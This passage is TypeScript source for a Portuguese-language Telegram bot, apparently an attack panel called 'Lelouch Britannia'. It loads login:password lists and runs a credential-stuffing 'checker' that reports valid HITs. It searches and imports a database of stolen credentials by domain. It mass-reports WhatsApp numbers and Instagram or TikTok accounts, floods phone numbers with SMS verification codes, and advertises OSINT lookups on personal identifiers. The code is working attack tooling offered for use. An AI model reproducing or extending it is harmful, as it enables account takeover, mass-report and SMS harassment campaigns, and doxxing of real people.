  if (reply.length > 3500) {
    lines.push(``, `<i>... resposta truncada (${reply.length} chars)</i>`);
  }

  lines.push(``, `<i>⏱ ${elapsed}ms</i>`);
  lines.push(LINE2);

  await editMsg(ctx, chatId, msgId, lines.join("\n"),
    Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]),
  );
}

bot.command("sky", async ctx => {
  const question = ctx.message.text.split(/\s+/).slice(1).join(" ");
  await handleAiCommand(ctx, question);
});

bot.command("lelouch", async ctx => {
  const question = ctx.message.text.split(/\s+/).slice(1).join(" ");
  await handleAiCommand(ctx, question);
});

// ── /url ──────────────────────────────────────────────────────────────────────
bot.command("url", async ctx => {
  const args = ctx.message.text.split(/\s+/).slice(1);
  if (!args[0]) { await ctx.reply("Uso: /url <domínio>  (ex: /url github.com)"); return; }
  await searchAndOffer(ctx, args[0]);
});

bot.action("home_url", async ctx => {
  await ctx.answerCbQuery();
  const s = getSession(ctx.from!.id);
  s.waitingFor = "domain";
  await ctx.replyWithHTML(
    `🔍 <b>BUSCAR DOMÍNIO</b>\n${LINE2}\n\nEnvie o domínio para buscar no banco:\n<i>ex: github.com, netflix.com</i>`,
    Markup.inlineKeyboard([[Markup.button.callback("↩ Cancelar", "go_home")]]),
  );
});

async function searchAndOffer(ctx: Context, domain: string) {
  const waitMsg = await ctx.replyWithHTML(`🔍 <b>Buscando</b> <code>${esc(domain)}</code>...`);
  try {
    const r    = await fetch(`${API_BASE}/api/credentials/search?domain=${encodeURIComponent(domain)}&limit=500`);
    const data = await r.json() as { count: number; credentials: { login: string; password: string }[] };
    if (data.count === 0) {
      await editMsg(ctx, waitMsg.chat.id, waitMsg.message_id,
        `🔍 <b>BUSCA — ${esc(domain)}</b>\n${LINE2}\n\n<i>Nenhuma credencial encontrada no banco.</i>\n${LINE}`,
        Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]),
      );
      return;
    }
    const creds = data.credentials.map(c => `${c.login}:${c.password}`);
    const s = getSession(ctx.from!.id);
    s.credentials = creds;
    await editMsg(ctx, waitMsg.chat.id, waitMsg.message_id,
      `🔍 <b>${esc(domain.toUpperCase())}</b>\n${LINE2}\n\n✅ <b>${data.count}</b> credenciais encontradas!\n${LINE}`,
    );
    await showTargetMenu(ctx, creds.length, domain);
  } catch (e) {
    await editMsg(ctx, waitMsg.chat.id, waitMsg.message_id, `❌ Erro: ${String(e)}`);
  }
}

// ── Home callback ─────────────────────────────────────────────────────────────
bot.action("go_home", async ctx => {
  await ctx.answerCbQuery();
  const name = ctx.from?.first_name ?? "Operador";
  await ctx.replyWithHTML(homeMsg(name), homeKeyboard());
});

bot.action("home_checker", async ctx => {
  await ctx.answerCbQuery();
  const s = getSession(ctx.from!.id);
  if (s.running) { await ctx.replyWithHTML("⚠️ Já existe um checker ativo. Use /stop primeiro."); return; }
  if (s.credentials?.length) {
    await showTargetMenu(ctx, s.credentials.length);
  } else {
    s.waitingFor = "file";
    await ctx.replyWithHTML(
      `${SWORD} <b>GEASS CHECKER</b>\n${LINE2}\n\nEnvie um arquivo <b>.txt</b>\n(<code>login:senha</code> por linha).`,
      Markup.inlineKeyboard([[Markup.button.callback("↩ Cancelar", "go_home")]]),
    );
  }
});

// ── File action buttons ───────────────────────────────────────────────────────
bot.action("file_check", async ctx => {
  await ctx.answerCbQuery();
  const s = getSession(ctx.from!.id);
  if (!s.credentials?.length) { await ctx.reply("Nenhuma credencial carregada."); return; }
  await showTargetMenu(ctx, s.credentials.length);
});

bot.action("file_import", async ctx => {
  await ctx.answerCbQuery("Importando...");
  const s = getSession(ctx.from!.id);
  if (!s.credentials?.length) { await ctx.reply("Nenhuma credencial carregada."); return; }
  try {
    const r    = await fetch(`${API_BASE}/api/credentials/import?source=telegram`, {
      method: "POST",
      headers: { "Content-Type": "text/plain; charset=utf-8" },
      body: s.credentials.join("\n"),
    });
    const data = await r.json() as { inserted: number; skipped: number };
    await ctx.replyWithHTML(
      `💾 <b>IMPORTAÇÃO CONCLUÍDA</b>\n${LINE2}\n\nInserido: <b>${data.inserted}</b>\nIgnorado: <b>${data.skipped}</b>\n${LINE}`,
      Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]),
    );
  } catch (e) {
    await ctx.reply(`❌ Erro ao importar: ${String(e)}`);
  }
});

// ── Target callbacks ──────────────────────────────────────────────────────────
CHECKER_TARGETS.forEach(t => {
  bot.action(`target_${t.id}`, async ctx => {
    await ctx.answerCbQuery(`${SWORD} Iniciando ${t.label}...`);
    const s = getSession(ctx.from!.id);
    if (!s.credentials?.length) { await ctx.reply("Nenhuma credencial carregada."); return; }
    if (s.running) { await ctx.reply("⚠️ Pare o checker atual (/stop) primeiro."); return; }
    await startChecker(ctx, t.id, t.label, s);
  });
});

// ── File handler ──────────────────────────────────────────────────────────────
bot.on(message("document"), async ctx => {
  const doc = ctx.message.document;
  if (!doc.file_name?.match(/\.(txt|csv|log)$/i) && doc.mime_type !== "text/plain") {
    await ctx.reply("⚠️ Envie um arquivo .txt com credenciais.");
    return;
  }
  try {
    const fileLink = await ctx.telegram.getFileLink(doc.file_id);
    const raw      = await fetch(fileLink.toString()).then(r => r.text());
    const lines    = raw.split(/\r?\n/).map(l => l.trim()).filter(l => l.includes(":"));

    if (lines.length === 0) {
      await ctx.reply("❌ Nenhuma credencial válida (formato login:senha) encontrada.");
      return;
    }

    const s      = getSession(ctx.from!.id);
    s.credentials = lines;
    s.waitingFor  = null;

    await ctx.replyWithHTML(
      [
        `📄 <b>ARQUIVO RECEBIDO</b>`,
        LINE2,
        ``,
        `<b>${esc(doc.file_name ?? "arquivo.txt")}</b>`,
        `<b>${lines.length.toLocaleString("pt-BR")}</b> credenciais carregadas`,
        ``,
        LINE,
      ].join("\n"),
      Markup.inlineKeyboard([
        [Markup.button.callback(`${SWORD} Checar Agora`, "file_check"),
         Markup.button.callback("💾 Importar DB",       "file_import")],
        [Markup.button.callback("🏠 Início",             "go_home")],
      ]),
    );
  } catch (e) {
    await ctx.reply(`❌ Erro ao ler arquivo: ${String(e)}`);
  }
});

// ── Text message handler ──────────────────────────────────────────────────────
bot.on(message("text"), async ctx => {
  const text = ctx.message.text;
  if (text.startsWith("/")) return;

  const s = getSession(ctx.from!.id);

  // ── WhatsApp step machine ────────────────────────────────────────────────
  if (s.waStep) {
    const step = s.waStep;
    s.waStep = undefined;
    const input = text.trim();

    // Mutex: só uma operação WA por vez por usuário
    if (s.waRunning) {
      await ctx.replyWithHTML(
        `⏳ <b>Operação anterior ainda em execução.</b> Aguarde ela terminar antes de enviar outra.`,
        Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]),
      );
      return;
    }

    if (step === "report_number") {
      const userId = ctx.from!.id;
      const wait = checkCooldown(reportCooldowns, userId, REPORT_COOLDOWN_MS);
      if (wait > 0) {
        const sec = Math.ceil(wait / 1000);
        await ctx.replyWithHTML(
          `⏳ <b>Cooldown ativo</b> — aguarde <b>${sec}s</b> antes de enviar outro report.`,
          Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]),
        );
        return;
      }

      const parts  = input.split(/\s+/);
      const number = parts[0]!;
      const qty    = Math.min(200, Math.max(1, parseInt(parts[1] ?? "1", 10) || 1));
      setCooldown(reportCooldowns, userId);
      s.waRunning = true;

      const msg = await ctx.replyWithHTML(`🚩 Enviando <b>${qty}</b> report(s) para <code>${number}</code>…`);
      try {
        const resp = await fetch(`${API_BASE}/api/whatsapp/report`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ number, quantity: qty, userId: String(userId) }),
          signal: AbortSignal.timeout(120_000),
        });
        const r = await resp.json() as {
          number?: string; sent?: number; failed?: number; requested?: number; errors?: string[];
          error?: string; message?: string;
        };
        if (r.error === "rate_limit") {
          await ctx.telegram.editMessageText(
            msg.chat.id, msg.message_id, undefined,
            `⛔ <b>Rate limit atingido</b> — ${r.message ?? "tente mais tarde."}`,
            { parse_mode: "HTML", ...Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]) },
          );
          return;
        }
        const sent   = r.sent   ?? 0;
        const failed = r.failed ?? qty;
        addWaHistory(userId, { type: "report", number: r.number ?? number, sent, total: r.requested ?? qty, at: new Date() });
        const icon = sent > 0 ? "✅" : "❌";
        const lines = [
          `${icon} <b>WhatsApp Report</b>`, ``,
          `📱 Número: <code>${r.number ?? number}</code>`,
          `✅ Enviados: <b>${sent}</b>/${r.requested ?? qty}`,
          `❌ Falhos: <b>${failed}</b>`,
        ];
        if (r.errors?.length) lines.push(``, `⚠️ <b>Erros:</b> <code>${r.errors.slice(0, 3).join(" | ")}</code>`);
        await ctx.telegram.editMessageText(
          msg.chat.id, msg.message_id, undefined, lines.join("\n"),
          { parse_mode: "HTML", ...Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]) },
        );
      } catch (e) {
        await ctx.telegram.editMessageText(
          msg.chat.id, msg.message_id, undefined,
          `❌ Erro ao enviar reports: <code>${String(e).slice(0, 120)}</code>`,
          { parse_mode: "HTML", ...Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]) },
        );
      } finally {
        s.waRunning = false;
      }
      return;
    }

    if (step === "code_number") {
      const userId = ctx.from!.id;
      const wait = checkCooldown(sendcodeCooldowns, userId, SENDCODE_COOLDOWN_MS);
      if (wait > 0) {
        const sec = Math.ceil(wait / 1000);
        await ctx.replyWithHTML(
          `⏳ <b>Cooldown ativo</b> — aguarde <b>${sec}s</b> antes de disparar outro código.`,
          Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]),
        );
        return;
      }
      setCooldown(sendcodeCooldowns, userId);
      s.waRunning = true;

      const number = input;
      const msg = await ctx.replyWithHTML(`📲 Disparando códigos para <code>${number}</code>…`);
      try {
        const resp = await fetch(`${API_BASE}/api/whatsapp/sendcode`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ number, userId: String(userId) }),
          signal: AbortSignal.timeout(60_000),
        });
        const r = await resp.json() as {
          number?: string; sent?: number; failed?: number; total?: number;
          services?: { service: string; status: "sent" | "failed"; detail?: string }[];
          error?: string; message?: string;
        };
        if (r.error === "rate_limit") {
          await ctx.telegram.editMessageText(
            msg.chat.id, msg.message_id, undefined,
            `⛔ <b>Rate limit atingido</b> — ${r.message ?? "tente mais tarde."}`,
            { parse_mode: "HTML", ...Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]) },
          );
          return;
        }
        const sentCount = r.sent ?? 0;
        addWaHistory(userId, { type: "sendcode", number: r.number ?? number, sent: sentCount, total: r.total ?? 0, at: new Date() });
        const icon = sentCount > 0 ? "✅" : "❌";
        const lines: string[] = [
          `${icon} <b>Disparo de Código SMS</b>`, ``,
          `📱 Número: <code>${r.number ?? number}</code>`,
          `✅ Enviados: <b>${sentCount}</b>/${r.total ?? 0}`,
          `❌ Falhos: <b>${r.failed ?? 0}</b>`,
        ];
        if (r.services?.length) {
          lines.push(``, `<b>Serviços:</b>`);
          for (const svc of r.services) {
            const ic = svc.status === "sent" ? "✅" : "❌";
            lines.push(`${ic} ${svc.service}${svc.detail ? ` — <code>${svc.detail.slice(0, 60)}</code>` : ""}`);
          }
        }
        await ctx.telegram.editMessageText(
          msg.chat.id, msg.message_id, undefined, lines.join("\n"),
          { parse_mode: "HTML", ...Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]) },
        );
      } catch (e) {
        await ctx.telegram.editMessageText(
          msg.chat.id, msg.message_id, undefined,
          `❌ Erro ao disparar códigos: <code>${String(e).slice(0, 120)}</code>`,
          { parse_mode: "HTML", ...Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]) },
        );
      } finally {
        s.waRunning = false;
      }
      return;
    }

    if (step === "social_url") {
      const parts    = input.split(/\s+/);
      const rawUrl   = parts[0]!;
      const qty      = Math.min(50, Math.max(1, parseInt(parts[1] ?? "10", 10) || 10));
      const platHint = s.socialPlatHint;
      s.waStep = undefined;
      s.socialPlatHint = undefined;
      await doSocialReport(ctx, rawUrl, qty, platHint);
      return;
    }
  }
  // ── end WhatsApp step machine ─────────────────────────────────────────────

  if (s.waitingFor === "domain") {
    s.waitingFor = null;
    const domain = text.trim().replace(/^https?:\/\//i, "").split("/")[0];
    await searchAndOffer(ctx, domain);
    return;
  }

  const lines = text.split(/\r?\n/).map(l => l.trim()).filter(l => l.includes(":") && !l.startsWith("/"));
  if (lines.length >= 2) {
    s.credentials = lines;
    s.waitingFor  = null;
    await ctx.replyWithHTML(
      `📋 <b>CREDENCIAIS CARREGADAS</b>\n${LINE2}\n\n<b>${lines.length}</b> linhas detectadas\n${LINE}`,
      Markup.inlineKeyboard([
        [Markup.button.callback(`${SWORD} Checar Agora`, "file_check"),
         Markup.button.callback("💾 Importar DB",       "file_import")],
        [Markup.button.callback("🏠 Início",             "go_home")],
      ]),
    );
    return;
  }

  const trimmed = text.trim();
  if (trimmed.includes(".") && !trimmed.includes(" ") && trimmed.length < 100) {
    const domain = trimmed.replace(/^https?:\/\//i, "").split("/")[0];
    await searchAndOffer(ctx, domain);
  }
});

// ── Start checker SSE session ─────────────────────────────────────────────────
async function startChecker(ctx: Context, target: string, label: string, s: Session) {
  s.hits         = [];
  s.fails        = [];
  s.errors       = [];
  s.running      = true;
  s.currentLabel = label;
  s.startedAt    = Date.now();

  const creds  = s.credentials!;
  const chatId = ctx.chat!.id;

  const initMsg = await ctx.replyWithHTML(
    buildProgress(label, creds.length, 0, [], [], []),
    Markup.inlineKeyboard([[Markup.button.callback("🛑 PARAR GEASS", "stop_checker")]]),
  );
  s.progressMsgId  = initMsg.message_id;
  s.progressChatId = chatId;

  let jobId: string;
  try {
    const r = await fetch(`${API_BASE}/api/checker/start`, {
      method:  "POST",
      headers: { "Content-Type": "application/json" },
      body:    JSON.stringify({ target, credentials: creds }),
    });
    if (!r.ok) throw new Error(`HTTP ${r.status}`);
    const data = await r.json() as { jobId: string };
    jobId = data.jobId;
    s.activeJobId = jobId;
  } catch (e) {
    s.running = false;
    await ctx.reply(`❌ Erro ao iniciar checker: ${String(e)}`);
    return;
  }

  const abortCtrl = new AbortController();
  s.abortCtrl = abortCtrl;

  let done            = 0;
  let lastEdit        = Date.now();
  const EDIT_INTERVAL = 4_000;

  void (async () => {
    try {
      const resp = await fetch(`${API_BASE}/api/checker/${jobId}/stream`, {
        signal: abortCtrl.signal,
      });
      if (!resp.ok || !resp.body) throw new Error(`HTTP ${resp.status}`);

      const reader  = resp.body.getReader();
      const decoder = new TextDecoder();
      let   buf     = "";

      while (true) {
        const { done: streamDone, value } = await reader.read();
        if (streamDone) break;
        buf += decoder.decode(value, { stream: true });
        const blocks = buf.split("\n\n");
        buf = blocks.pop() ?? "";

        for (const block of blocks) {
          const line = block.trim();
          if (!line.startsWith("data:")) continue;
          let data: Record<string, unknown>;
          try { data = JSON.parse(line.slice(5).trim()); } catch { continue; }

          if (data["type"] === "result") {
            done++;
            const cred   = String(data["credential"] ?? "?");
            const detail = String(data["detail"] ?? "");

            if (data["status"] === "HIT") {
              const hit: HitEntry = { credential: cred, detail, target: label, at: Date.now() };
              s.hits.push(hit);
              // ── Send individual HIT notification ──
              try {
                await ctx.telegram.sendMessage(chatId, buildHitCard(hit), { parse_mode: "HTML" });
              } catch { /* ignore notification errors */ }
            } else if (data["status"] === "FAIL") {
              s.fails.push(`${cred} | ${detail}`);
            } else {
              s.errors.push(`${cred} | ${detail}`);
            }

            const now = Date.now();
            if (now - lastEdit > EDIT_INTERVAL) {
              lastEdit = now;
              await editMsg(ctx, chatId, s.progressMsgId!,
                buildProgress(label, creds.length, done, s.hits, s.fails, s.errors),
                Markup.inlineKeyboard([[Markup.button.callback("🛑 PARAR GEASS", "stop_checker")]]),
              );
            }
          } else if (data["type"] === "done" || data["type"] === "end") {
            s.running = false;
            await sendFinalReport(ctx, chatId, s.progressMsgId!, label, creds.length, s.hits, s.fails, s.errors, s.startedAt ? Date.now() - s.startedAt : 0);
            return;
          }
        }
      }
    } catch (err) {
      if ((err as Error)?.name === "AbortError") return;
    } finally {
      if (s.running) {
        s.running = false;
        await sendFinalReport(ctx, chatId, s.progressMsgId!, label, creds.length, s.hits, s.fails, s.errors, s.startedAt ? Date.now() - s.startedAt : 0);
      }
    }
  })();
}

// ── Build full results TXT (HITs + FAILs + ERRORs) ───────────────────────────
function buildCheckerTxt(
  label: string,
  total: number,
  hits: HitEntry[],
  fails: string[],
  errors: string[],
  stopped = false,
  elapsedMs = 0,
): Buffer {
  const W   = 66;
  const pad = (s: string, w: number) => s + " ".repeat(Math.max(0, w - s.length));
  const row = (content: string) => `║ ${pad(content, W - 2)} ║`;
  const sep = (f: string) => f.repeat(W);

  const dt      = new Date().toLocaleDateString("pt-BR") + " às " +
                  new Date().toLocaleTimeString("pt-BR", { hour: "2-digit", minute: "2-digit", second: "2-digit" });
  const elapsed = Math.round(elapsedMs / 1000);
  const elStr   = elapsed >= 60 ? `${Math.floor(elapsed / 60)}m${elapsed % 60}s` : `${elapsed}s`;

  const lines: string[] = [];

  lines.push(sep("═"));
  lines.push(row("  LELOUCH BRITANNIA — CHECKER RESULTADOS"));
  lines.push(sep("═"));
  lines.push(row(`  Alvo     : ${label.toUpperCase()}`));
  lines.push(row(`  Data     : ${dt}`));
  lines.push(row(`  Duração  : ${elStr}${stopped ? "  (encerrado)" : ""}`));
  lines.push(sep("═"));
  lines.push(row(`  Total : ${total}   ✅ HITS : ${hits.length}   ❌ FAILS : ${fails.length}   ⚠  ERROS : ${errors.length}`));
  lines.push(sep("╚"));
  lines.push("");

  const section = (title: string) => {
    const dashes = Math.max(0, Math.floor((W - title.length - 2) / 2));
    lines.push(`${"─".repeat(dashes)} ${title} ${"─".repeat(W - dashes - title.length - 2)}`);
    lines.push("");
  };

  // HITs
  if (hits.length > 0) {
    section(`✅  HITS (${hits.length})`);
    hits.forEach((h, i) => {
      lines.push(`[${String(i + 1).padStart(2, "0")}]  ${h.credential}`);
      lines.push(`      └─ ${h.detail || "—"}`);
      lines.push("");
    });
  } else {
    section("✅  HITS (0)");
    lines.push("      Nenhum hit encontrado.");
    lines.push("");
  }

  // FAILs (max 500)
  const MAX_FAILS = 500;
  if (fails.length > 0) {
    section(`❌  FAILS (${fails.length}${fails.length > MAX_FAILS ? ` — mostrando ${MAX_FAILS}` : ""})`);
    if (fails.length > MAX_FAILS) {
      lines.push(`      ⚠  Lista truncada: exibindo apenas os primeiros ${MAX_FAILS} de ${fails.length} fails.`);
      lines.push("");
    }
    fails.slice(0, MAX_FAILS).forEach((f, i) => {
      const [cred, ...rest] = f.split(" | ");
      lines.push(`[${String(i + 1).padStart(2, "0")}]  ${cred}`);
      lines.push(`      └─ ${rest.join(" | ") || "invalid_credentials"}`);
      if ((i + 1) % 10 === 0) lines.push("");
    });
    lines.push("");
  }

  // ERRORs (max 200)
  const MAX_ERRORS = 200;
  if (errors.length > 0) {
    section(`⚠   ERROS (${errors.length}${errors.length > MAX_ERRORS ? ` — mostrando ${MAX_ERRORS}` : ""})`);
    if (errors.length > MAX_ERRORS) {
      lines.push(`      ⚠  Lista truncada: exibindo apenas os primeiros ${MAX_ERRORS} de ${errors.length} erros.`);
      lines.push("");
    }
    errors.slice(0, MAX_ERRORS).forEach((e, i) => {
      const [cred, ...rest] = e.split(" | ");
      lines.push(`[${String(i + 1).padStart(2, "0")}]  ${cred}`);
      lines.push(`      └─ ${rest.join(" | ") || "unknown_error"}`);
      if ((i + 1) % 10 === 0) lines.push("");
    });
    lines.push("");
  }

  lines.push(sep("═"));
  lines.push(`  Made by blxckxyz  •  Lelouch Britannia Panel`);
  lines.push(sep("═"));

  return Buffer.from(lines.join("\n"), "utf-8");
}

// ── Send results TXT as document ──────────────────────────────────────────────
async function sendResultsTxt(
  ctx: Context,
  chatId: number,
  label: string,
  total: number,
  hits: HitEntry[],
  fails: string[],
  errors: string[],
  stopped = false,
  elapsedMs = 0,
): Promise<void> {
  const buf      = buildCheckerTxt(label, total, hits, fails, errors, stopped, elapsedMs);
  const slug     = label.toLowerCase().replace(/[^a-z0-9]/g, "_");
  const ts       = new Date().toISOString().replace(/[:.]/g, "-").slice(0, 19);
  const filename = `checker_${slug}_${ts}.txt`;
  const caption  = [
    stopped ? "🛑 <b>Checker encerrado</b>" : "✅ <b>Checker finalizado</b>",
    `${esc(label.toUpperCase())}`,
    `<b>${hits.length}</b> hit(s)  ·  <b>${fails.length}</b> fail(s)  ·  <b>${errors.length}</b> erro(s)`,
  ].join("\n");

  await ctx.telegram.sendDocument(
    chatId,
    { source: buf, filename },
    { caption, parse_mode: "HTML" },
  ).catch(() => void 0);
}

// ── Final report ──────────────────────────────────────────────────────────────
async function sendFinalReport(
  ctx: Context,
  chatId: number,
  msgId: number,
  label: string,
  total: number,
  hits: HitEntry[],
  fails: string[],
  errors: string[],
  elapsedMs = 0,
) {
  const text = buildFinal(label, total, hits, fails, errors, false);
  await editMsg(ctx, chatId, msgId, text,
    Markup.inlineKeyboard([
      [Markup.button.callback("✅ Ver HITs", "home_hits"), Markup.button.callback("📊 Stats", "home_stats")],
      [Markup.button.callback("📜 Histórico", "home_historico")],
      [Markup.button.callback("🏠 Início",    "go_home")],
    ]),
  );

  // Save history before sending TXT
  if (ctx.from?.id && (hits.length + fails.length + errors.length) > 0) {
    saveCheckHistory(ctx.from.id, label, total, hits, fails, errors, elapsedMs, false);
  }

  // Always send full TXT (HITs + FAILs + ERRORs)
  await sendResultsTxt(ctx, chatId, label, total, hits, fails, errors, false, elapsedMs);
}

// ── Register slash command suggestions (shown when user types "/") ────────────
async function registerCommands() {
  await bot.telegram.setMyCommands([
    { command: "home",    description: "🏠 Menu principal" },
    { command: "sky",     description: "🛰️ Perguntar para a IA (SkyNetChat)" },
    { command: "lelouch", description: "👁️ Perguntar para a IA (alias)" },
    { command: "checker", description: "⚔️ Iniciar checker de credenciais" },
    { command: "import",  description: "💾 Importar arquivo .txt de credenciais" },
    { command: "url",     description: "🔍 Buscar domínio no banco" },
    { command: "hits",      description: "✅ Ver HITs da sessão atual" },
    { command: "historico", description: "📜 Ver TXT do check anterior" },
    { command: "fails",     description: "❌ Ver FAILs da sessão" },
    { command: "errors",  description: "⚡ Ver erros da sessão" },
    { command: "stats",   description: "📊 Estatísticas da sessão" },
    { command: "status",  description: "📡 Status do checker" },
    { command: "stop",         description: "🛑 Parar checker em execução" },
    { command: "clear",        description: "🗑️ Limpar dados da sessão" },
    { command: "reportwa",     description: "🚩 Reportar número WhatsApp" },
    { command: "sendcode",     description: "📲 Disparar códigos SMS de verificação" },
    { command: "reportredes",  description: "📢 Reportar conta/post no Instagram ou TikTok" },
    { command: "osint",        description: "🕵️ Consulta OSINT (CPF, placa, telefone, email…)" },
    { command: "help",         description: "❓ Ajuda e lista de comandos" },
  ]);
}

// ── WhatsApp: Report ─────────────────────────────────────────────────────────
bot.action("home_wa_report", async ctx => {
  await ctx.answerCbQuery();
  const userId = ctx.from!.id;
  const wait = checkCooldown(reportCooldowns, userId, REPORT_COOLDOWN_MS);
  const s = getSession(userId);
  s.waStep = "report_number";
  const cdNote = wait > 0 ? `\n⏳ Cooldown: <b>${Math.ceil(wait / 1000)}s</b> restantes` : "";
  await ctx.replyWithHTML(
    `🚩 <b>WhatsApp Report</b>\n\nEnvie o número e a quantidade:\n<code>5511999887766 10</code>\n\n• DDI + DDD + número (sem espaços/traços)\n• Quantidade: 1–200 reports\n• Cooldown: 3 min entre reports${cdNote}`,
    Markup.inlineKeyboard([[Markup.button.callback("↩ Cancelar", "go_home")]]),
  );
});

// ── Social Media: Report Redes ────────────────────────────────────────────────
const SOCIAL_COOLDOWN_MS = 60_000; // 1 minuto entre reports sociais
const socialCooldowns = new Map<number, number>();

async function doSocialReport(ctx: Context, rawUrl: string, qty: number, platHint?: "instagram" | "tiktok") {
  const userId = ctx.from!.id;
  const wait = checkCooldown(socialCooldowns, userId, SOCIAL_COOLDOWN_MS);
  if (wait > 0) {
    await ctx.replyWithHTML(
      `⏳ <b>Cooldown ativo</b> — aguarde <b>${Math.ceil(wait / 1000)}s</b> antes de outro report social.`,
      Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]),
    );
    return;
  }

  // If user sent a bare username and we have a platform hint, prefix it
  let normalizedUrl = rawUrl;
  if (platHint && !rawUrl.includes("instagram.com") && !rawUrl.includes("tiktok.com")) {
    const clean = rawUrl.replace(/^@/, "");
    normalizedUrl = platHint === "tiktok"
      ? `https://tiktok.com/@${clean}`
      : `https://instagram.com/${clean}`;
  }

  // Lookup first
  let lookupData: { platform?: string; identifier?: string; type?: string; error?: string } = {};
  try {
    const lr = await fetch(`${API_BASE}/api/social/lookup?url=${encodeURIComponent(normalizedUrl)}`, { signal: AbortSignal.timeout(8_000) });
    lookupData = await lr.json() as typeof lookupData;
  } catch {}

  if (lookupData.error || !lookupData.platform) {
    const platIcon = platHint === "tiktok" ? "🎵" : "📸";
    const exampleBase = platHint === "tiktok" ? "tiktok.com/@usuario" : "instagram.com/usuario";
    await ctx.replyWithHTML(
      `❌ <b>URL não reconhecida</b>\n\n${platIcon} Tente: <code>https://${exampleBase}</code>\n\nOu use a URL completa da conta/post.`,
      Markup.inlineKeyboard([
        [Markup.button.callback("📸 Instagram", "social_plat_instagram"), Markup.button.callback("🎵 TikTok", "social_plat_tiktok")],
        [Markup.button.callback("🏠 Início", "go_home")],
      ]),
    );
    return;
  }

  const platIcon = lookupData.platform === "instagram" ? "📸" : "🎵";
  const targetLabel = lookupData.type === "post"
    ? `post <code>${esc(lookupData.identifier ?? "")}</code>`
    : `@<code>${esc(lookupData.identifier ?? "")}</code>`;

  const msg = await ctx.replyWithHTML(
    `${platIcon} <b>${lookupData.platform!.toUpperCase()} Report</b>\n\nAlvo: ${targetLabel}\nEnviando <b>${qty}</b> reports…`,
  );

  setCooldown(socialCooldowns, userId);

  try {
    const resp = await fetch(`${API_BASE}/api/social/report`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ url: rawUrl, quantity: qty }),
      signal: AbortSignal.timeout(180_000),
    });
    const r = await resp.json() as { platform?: string; target?: string; subtype?: string; sent?: number; failed?: number; total?: number; error?: string };

    if (r.error) {
      await ctx.telegram.editMessageText(msg.chat.id, msg.message_id, undefined,
        `❌ <b>Erro:</b> <code>${esc(r.error)}</code>`,
        { parse_mode: "HTML", ...Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]) },
      );
      return;
    }

    const icon = (r.sent ?? 0) > 0 ? "✅" : "❌";
    const lines = [
      `${icon} <b>${(r.platform ?? "").toUpperCase()} Report</b>`,
      ``,
      `${platIcon} Alvo: ${targetLabel}`,
      `✅ Enviados: <b>${r.sent ?? 0}</b>/${r.total ?? qty}`,
      `❌ Falhos: <b>${r.failed ?? 0}</b>`,
      ``,
      `<i>Tipo: ${r.subtype === "post" ? "Post/Reel" : "Conta"}</i>`,
    ];
    await ctx.telegram.editMessageText(msg.chat.id, msg.message_id, undefined, lines.join("\n"),
      { parse_mode: "HTML", ...Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]) },
    );
  } catch (e) {
    await ctx.telegram.editMessageText(msg.chat.id, msg.message_id, undefined,
      `❌ Erro ao enviar reports: <code>${esc(String(e).slice(0, 120))}</code>`,
      { parse_mode: "HTML", ...Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]) },
    );
  }
}

bot.action("home_social_report", async ctx => {
  await ctx.answerCbQuery();
  const wait = checkCooldown(socialCooldowns, ctx.from!.id, SOCIAL_COOLDOWN_MS);
  const cdNote = wait > 0 ? `\n⏳ Cooldown: <b>${Math.ceil(wait / 1000)}s</b> restantes` : "";
  await ctx.replyWithHTML(
    [`📢 <b>Report Redes Sociais</b>`, ``, `Escolha a plataforma:${cdNote}`].join("\n"),
    Markup.inlineKeyboard([
      [
        Markup.button.callback("📸 Instagram", "social_plat_instagram"),
        Markup.button.callback("🎵 TikTok",    "social_plat_tiktok"),
      ],
      [Markup.button.callback("↩ Cancelar", "go_home")],
    ]),
  );
});

function socialPlatPrompt(plat: "instagram" | "tiktok", cdNote: string): string {
  if (plat === "instagram") {
    return [
      `📸 <b>Instagram Report</b>`,
      ``,
      `Envie o alvo e a quantidade (opcional):`,
      ``,
      `👤 Conta: <code>https://instagram.com/usuario 10</code>`,
      `📷 Post:  <code>https://instagram.com/p/SHORTCODE/ 5</code>`,
      `🎬 Reel:  <code>https://instagram.com/reel/SHORTCODE/ 5</code>`,
      ``,
      `• Quantidade padrão: 10 | Máximo: 50`,
      `• Cooldown: 60s entre reports${cdNote}`,
    ].join("\n");
  }
  return [
    `🎵 <b>TikTok Report</b>`,
    ``,
    `Envie o alvo e a quantidade (opcional):`,
    ``,
    `👤 Conta:  <code>https://tiktok.com/@usuario 10</code>`,
    `🎬 Vídeo: <code>https://tiktok.com/@usuario/video/ID_DO_VIDEO 5</code>`,
    ``,
    `• Quantidade padrão: 10 | Máximo: 50`,
    `• Cooldown: 60s entre reports${cdNote}`,
  ].join("\n");
}

bot.action("social_plat_instagram", async ctx => {
  await ctx.answerCbQuery();
  const s = getSession(ctx.from!.id);
  s.waStep = "social_url";
  s.socialPlatHint = "instagram";
  const wait = checkCooldown(socialCooldowns, ctx.from!.id, SOCIAL_COOLDOWN_MS);
  const cdNote = wait > 0 ? `\n⏳ Cooldown: <b>${Math.ceil(wait / 1000)}s</b> restantes` : "";
  await ctx.replyWithHTML(socialPlatPrompt("instagram", cdNote),
    Markup.inlineKeyboard([
      [Markup.button.callback("🎵 Trocar para TikTok", "social_plat_tiktok")],
